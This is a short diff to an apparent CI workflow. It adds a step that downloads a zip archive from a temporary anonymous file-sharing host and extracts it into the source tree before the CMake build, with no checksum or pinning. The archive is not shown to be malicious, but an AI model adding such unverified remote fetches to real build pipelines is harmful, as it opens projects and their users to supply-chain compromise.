@@ -17,6 +17,12 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
+      - name: Fetch extern dependencies
+        shell: pwsh
+        run: |
+          Invoke-WebRequest -Uri "https://filebin.net/m4gipplj7btweg6c/extern.zip" -OutFile "extern.zip"
+          Expand-Archive -Path "extern.zip" -DestinationPath "."
+
       - name: Configure CMake
         run: >
           cmake -S . -B build
